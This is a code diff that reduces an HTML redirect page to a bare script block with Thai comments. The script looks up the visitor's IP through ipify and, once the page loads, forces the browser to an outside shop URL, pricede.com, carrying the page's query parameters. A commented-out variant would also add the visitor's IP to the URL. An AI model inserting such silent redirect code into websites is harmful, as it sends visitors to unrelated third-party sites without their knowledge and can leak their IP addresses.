@@ -1,10 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect with IP and URL</title>
-    <script>
+<script>
         // ดึง IP Address ของผู้ใช้งานจาก API ipify
         function getIPAddress() {
             return fetch('https://api.ipify.org?format=json')
@@ -30,8 +24,6 @@
             // สร้าง URL ปลายทางใหม่โดยรวม IP Address ของผู้ใช้
             //const newURL = 'https://v3center.shop/product/' + queryParams + '—' + ipAddress;
             window.location.replace('https://pricede.com/re.php?pid=' + queryParams);
-
-
         }
 
         // เริ่มกระบวนการหลังจากโหลดหน้าเว็บเสร็จแล้ว
@@ -45,8 +37,3 @@
             });
         }
     </script>
-</head>
-<body>
-    <h1>Redirecting based on your IP and URL...</h1>
-</body>
-</html>
